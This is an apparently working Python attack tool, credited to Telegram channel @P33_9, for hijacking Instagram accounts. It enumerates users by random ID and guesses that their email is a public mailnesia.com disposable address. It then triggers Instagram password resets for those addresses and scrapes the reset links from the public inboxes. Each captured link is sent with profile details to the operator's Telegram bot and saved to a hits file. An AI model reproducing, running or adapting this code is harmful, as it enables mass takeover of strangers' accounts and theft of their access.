 import sys
import subprocess 
import requests
import time
import random
from threading import Thread
import re
try:
    import h2
except ImportError:
    print("جارٍ تثبيت حزمة h2 المطلوبة لـ HTTP/2...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "h2"])
    import h2
try:
    import re
    import httpx
    import user_agent
except:
    os.system("pip install httpx httpx[http2] user_agent")
    import httpx
    import user_agent    
import os
import requests
import string
import random
import time
from threading import Thread, Lock 
import requests
from user_agent import generate_user_agent
from hashlib import md5
from bs4 import BeautifulSoup
import base64
import secrets
from random import choice
from threading import Thread, Lock 
try:
   
    import pyfiglet
    from rich.console import Console
    from cfonts import render, say
except ImportError:
    os.system("pip install requests telethon pyfiglet rich cfonts")
    
    

b = random.randint(5,208)
bo = f'\x1b[38;5;{b}m'
ED='\x1b[38;5;208m'
BLUE = '\033[94m'
Z = '\033[1;31m' 
YELLOW = '\033[1;33m' 
O = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m' 
M = '\033[2;36m'
Y = '\033[1;34m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m' 
B = '\033[2;36m'
Y = '\033[1;34m' 
B="\033[1;30m" 
R="\033[1;31m" 
G="\033[1;32m" 
Y="\033[1;33m" 
Bl="\033[1;34m" 
P="\033[1;35m" 
C="\033[1;36m" 
W="\033[1;37m" 
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
Y = '\033[1;34m' 
M = '\x1b[1;37m'
U = '\x1b[1;37m'
X = '\033[1;33m' 
Y = '\033[1;34m' 
M = '\x1b[1;37m'
S = '\033[1;33m'
R = '\033[1;31m' 
F = '\033[2;32m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
J = '\033[2;36m'
N = '\033[1;37m'
import json
import webbrowser
channel_link = "https://t.me/P33_9"
webbrowser.open(channel_link)

def banner():
	WDEH = render('{END}', colors=['red', 'white'], align='center')
	print(f'''{J}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
 {N}DEV / @YAALI_515{J}| {N} Ch:@P33_9{J}| {N}PROGRAMMER /ALI-HAIDAR
{J}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
''')
banner()

token = input("Enter Your Token: ")
print("\n")
ID = input("Enter ID: ")

 


os.system("clear")




used_usernames = set()
lock = Lock()
hit = 0
badig = 0
badmil = 0
goodig = 0
bad_user = 0
def get_instagram_reset_data(email):

    username = email.split('@')[0]
    

    cookies1 = {
        '_ga': 'GA1.1.981477570.1773798319',
        '_ga_9YV891MPK3': 'GS2.1.s1773801444$o2$g1$t1773801623$j60$l0$h0',
    }

    headers1 = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Referer': 'https://m.mailnesia.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    try:
        response1 = requests.get(f'https://m.mailnesia.com/api/mailbox/{username}', cookies=cookies1, headers=headers1, timeout=10).json()
    except:
        return None, None
        
    if not (isinstance(response1, list) and len(response1) > 0):
        return None, None
        
    email_id = response1[0].get('id')
    

    cookies2 = {
        '_ga': 'GA1.1.981477570.1773798319',
        'mailbox': username,
        'language': 'ar',
        '_ga_9YV891MPK3': 'GS2.1.s1773801444$o2$g1$t1773801623$j60$l0$h0',
    }

    headers2 = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Referer': 'https://m.mailnesia.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    try:
        response2 = requests.get(f'https://mailnesia.com/mailbox/{username}/{email_id}/raw', cookies=cookies2, headers=headers2, timeout=10)
        html = response2.text
    except:
        return None, None


    reset_link = None
    

    html = re.sub(r'=\r?\n\s*', '', html)
    
    links = re.findall(r'href=3D"([^"]+)"', html)
    
    for link in links:
        if 'instagram.com/accounts/password/reset/confirm/' in link:
            clean = link.replace('=3D', '=')
            clean = clean.replace('&amp;', '&')
            clean = re.sub(r'==', '=', clean)
            reset_link = clean
            break


    extracted_user = None
    user_match = re.search(r'Hi ([a-zA-Z0-9_.]+)', html)
    if user_match:
        extracted_user = user_match.group(1)

    return reset_link, extracted_user
    
def info(email, reset_link, extracted_user):
    global hit
    username = extracted_user
    hit += 1
    

    def send_telegram(text):
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        try:
            requests.post(url, json={
                'chat_id': ID,
                'text': text,
                'parse_mode': 'HTML'
            })
        except:
            pass
    
    try:
        url = f'https://www.instagram.com/{username}/'
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        meta_description = soup.find('meta', attrs={'name': 'description'})
        name_tag = soup.find('meta', property='og:title')
        
        if meta_description and name_tag:
            content = meta_description.get('content').replace(',', '')
            parts = content.split()
            posts = parts[4]
            followers = parts[0]
            following = parts[2]
            name = name_tag['content'].split('(@')[0].strip()
            
            msg = f'''
╔   ─────━ @P33_9       //  @YAALI_515  ━─────   ╗
 ⌦ [ mailnesia.com ] 
     ✺ 𝚗𝚊𝚖𝚎 : {name}
     ✺ username : @{username} 
     ✺ 𝙴𝚖𝚊𝚒𝚕 {email}
     ✺ 𝚏𝚘𝚕𝚕𝚘𝚠𝚎𝚛𝚜 : {followers}
     ✺ 𝚏𝚘𝚕𝚕𝚘𝚠𝚒𝚗𝚐 : {following}
     ✺ 𝚙𝚘𝚜𝚝𝚜 : {posts}
     ✺ 𝗨𝗥𝗟: https://www.instagram.com/{username}/ 
     ✺ Reset : {reset_link}
        ❝ By @P33_9 ❞
    '''
            with open('hits1.txt', 'a', encoding='utf-8') as ff:
                ff.write(f'{msg}\n')
            
            send_telegram(msg)
            
    except Exception as e:
        msg = f'''
╔   ─────━ @P33_9  //@YAALI_515 ━─────   ╗
 ⌦ [ mailnesia.com ] 
     ✺ username : @{username} 
     ✺ 𝙴𝚖𝚊𝚒𝚕 {email}
     ✺ 𝗨𝗥𝗟: https://www.instagram.com/{username}/ 
     ✺ Reset : {reset_link}
        ❝ By @P33_9 ❞
        '''
        
        send_telegram(msg)
        with open('hits1.txt', 'a', encoding='utf-8') as ff:
            ff.write(f'{msg}\n')
        

	           
    	

def gen_jazoest():
    return str(random.randint(10000, 99999))


def gen_session_id():
    part1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
    part2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
    return f"{part1}:{part2}:{random.randint(100,999)}"
    
    
	         
def reset_email(email):
    global bad_user, goodig, hit, badig    
    headers = {
    "user-agent": user_agent.generate_user_agent(),
    "x-ig-app-id": "936619743392459",
    "x-requested-with": "XMLHttpRequest",
    "x-instagram-ajax": "1032099486",
    "x-csrftoken": "missing",
    "x-asbd-id": "359341",
    "origin": "https://www.instagram.com",
    "referer": "https://www.instagram.com/accounts/password/reset/",
    "accept-language": "en-US",
    "priority": "u=1, i",
}
                    
    r = httpx.Client(http2=True, headers=headers, timeout=20).post("https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", data={"email_or_username": email}).json()
    
    try:
    	
    	if r.get("message") == "No users found":
    	       	badig += 1
    	       	os.system('clear' if os.name == 'posix' else 'cls')
    	       	tt=(f''' 
{YELLOW}*{YELLOW} {F}hits :{hit}   
	    
{YELLOW}*{YELLOW} {R}badmail :{badmil}    
	    
{YELLOW}*{YELLOW} {ED}user: {email}  
	    
{YELLOW}*{YELLOW} {bo}badig :{badig} 
	    
{YELLOW}*{YELLOW} good ig :{goodig}
	
{YELLOW}*{YELLOW} {Y}By: @P33_9{Y}
	    ''')
    	       	print(tt)
    	elif r.get("toast_message") and "We sent an email to" in r["toast_message"]:
    		reset_link, extracted_user = get_instagram_reset_data(email)
    		if reset_link and extracted_user:
    			goodig += 1
    			info(email, reset_link, extracted_user)
    		os.system('clear' if os.name == 'posix' else 'cls')
    		tt=(f''' 
{YELLOW}*{YELLOW} {F}hits :{hit}   
	    
{YELLOW}*{YELLOW} {R}badmail :{badmil}    
	    
{YELLOW}*{YELLOW} {ED}user: {email}  
	    
{YELLOW}*{YELLOW} {bo}badig :{badig} 
	    
{YELLOW}*{YELLOW} good ig :{goodig}
	
{YELLOW}*{YELLOW} {Y}By: @P33_9{Y}
	    ''')
    		print(tt)
    	else:
    		badig += 1    		
    	body=r.get('body')
    	rest = body.split("to ")[1].split(" with")[0]
    	

    		
    	
    except:
        pass    
                      
def rest(email):
    global bad_user, goodig, hit, badig, badmil,bad_rest
    try:
            os.system('clear' if os.name == 'posix' else 'cls')
            tt=(f''' 
{YELLOW}*{YELLOW} {F}hits :{hit}   
	    
{YELLOW}*{YELLOW} {R}badmail :{badmil}    
	    
{YELLOW}*{YELLOW} {ED}user: {email}  
	    
{YELLOW}*{YELLOW} {bo}badig :{badig} 
	    
{YELLOW}*{YELLOW} good ig :{goodig}
	
{YELLOW}*{YELLOW} {Y}By: @P33_9{Y}
	    ''')
            print(tt)
            csrftoken = secrets.token_hex(16)
            ua = generate_user_agent()
            pp = choice('00')  

            if pp == '0':
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/accounts/signup/email/',
                    'user-agent': ua,
                    'x-csrftoken': csrftoken
                }
                data = {'email': email}

                response = requests.post(
                    'https://www.instagram.com/api/v1/web/accounts/check_email/',
                    headers=headers,
                    data=data
                )

                if 'email_is_taken' in response.text:
                    reset_email(email)
                    os.system('clear' if os.name == 'posix' else 'cls')
                    tt=(f''' 
{YELLOW}*{YELLOW} {F}hits :{hit}   
	    
{YELLOW}*{YELLOW} {R}badmail :{badmil}    
	    
{YELLOW}*{YELLOW} {ED}user: {email}  
	    
{YELLOW}*{YELLOW} {bo}badig :{badig} 
	    
{YELLOW}*{YELLOW} good ig :{goodig}
	
{YELLOW}*{YELLOW} {Y}By: @P33_9{Y}
	    ''')
                    print(tt)
                    
                    
                else:
                    badig += 1

            elif pp == '1':
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
                    'user-agent': ua,
                    'x-csrftoken': csrftoken,
                }
                data = {'username': email}

                response = requests.post(
                    'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                    headers=headers,
                    data=data
                ).text

                if '"user":true' in response:
                    pass
                else:
                    pass

    except Exception as e:
            print("Error:", e)
            
            
def clean_english_name(text):

    if not text:
        return text
    

    emoji_pattern = re.compile("["
                           u"\U0001F600-\U0001F64F"  
                           u"\U0001F300-\U0001F5FF"  
                           u"\U0001F680-\U0001F6FF"  
                           u"\U0001F1E0-\U0001F1FF"  
                           u"\U00002702-\U000027B0"
                           u"\U000024C2-\U0001F251"
                           u"\U0001f926-\U0001f937"
                           u"\U00010000-\U0010ffff"
                           u"\u2000-\u2FFF"  
                           u"\u2640-\u2642"  
                           u"\u2600-\u2B55"  
                           u"\u23cf"
                           u"\u23e9"
                           u"\u231a"
                           u"\ufe0f"  
                           u"\u3030"
                           "]+", flags=re.UNICODE)
    

    text = emoji_pattern.sub('', text)
    


    text = re.sub(r'[^a-zA-Z\s]', '', text)
    

    text = ' '.join(text.split())
    
    return text

def contains_arabic_or_persian(text):
    if not text or not isinstance(text, str):
        return False
    
    arabic_persian_pattern = re.compile(
        '[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]'
    )
    
    return bool(arabic_persian_pattern.search(text))
        
def rand_ids(existing_ids):  
    while True:
        Id = str(random.randrange(8107361000,8397361000))
        if Id not in existing_ids:
            existing_ids.add(Id)
            return Id

def collect_users_1():
    ids_1 = set()
    found_usernames_1 = set()

    def worker():
        global naif
        while True:
            try:
                rnd = str(random.randint(150, 999))
                user_agent_str = (
                    "Instagram 311.0.0.32.118 Android ("
                    + random.choice(["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"])
                    + "; "
                    + str(random.randint(100, 1300))
                    + "dpi; "
                    + str(random.randint(200, 2000))
                    + "x"
                    + str(random.randint(200, 2000))
                    + "; "
                    + random.choice(["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME", "INFINIX"])
                    + "; SM-T"
                    + rnd
                    + "; SM-T"
                    + rnd
                    + "; qcom; en_US; 545986"
                    + str(random.randint(111, 999))
                    + ")"
                )

                Id = rand_ids(ids_1)
                lsd = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))

                headers = {
                    'accept': '*/*',
                    'accept-language': 'en,en-US;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'dnt': '1',
                    'origin': 'https://www.instagram.com',
                    'priority': 'u=1, i',
                    'referer': 'https://www.instagram.com/cristiano/following/',
                    'user-agent': user_agent_str,
                    'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                    'x-fb-lsd': lsd,
                }

                data = {
                    'lsd': lsd,
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                    'variables': '{"userID":"' + str(Id) + '","username":"cristiano"}',
                    'server_timestamps': 'true',
                    'doc_id': '7717269488336001',
                }

                response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
                
                try:
                    resp_json = response.json()
                except Exception:
                    resp_json = {}

                if 'errors' in resp_json:
                    continue

                user_data = resp_json.get('data', {}).get('user', {})
                if not user_data:
                    continue

                username = user_data.get('username', '')
                full_name = user_data.get('full_name', '')
                

                if contains_arabic_or_persian(full_name):
                    continue
                

                full_name = clean_english_name(full_name)
                

                if not full_name:
                    continue
                    

                if ' ' in full_name:
                    full_name = full_name.split()[0]
                

                full_name = full_name.lower()
                
                follower_count = user_data.get('follower_count', 0)
                following_count = user_data.get('following_count', 0)
                media_count = user_data.get('media_count', 0)
                is_private = user_data.get('is_private', True)

                if not username or username in found_usernames_1:
                    continue

                if any(x in username for x in ["_"]) or len(username) < 6 or len(full_name) <4 or len(full_name) >7:
                    continue

                if is_private:
                    continue

                found_usernames_1.add(username)
                email = full_name + "@mailnesia.com"
                rest(email)

            except Exception as e:
                continue

    for _ in range(10):
        Thread(target=worker).start()

collect_users_1()
#ALI-HAIDAR ON TELEGRAM
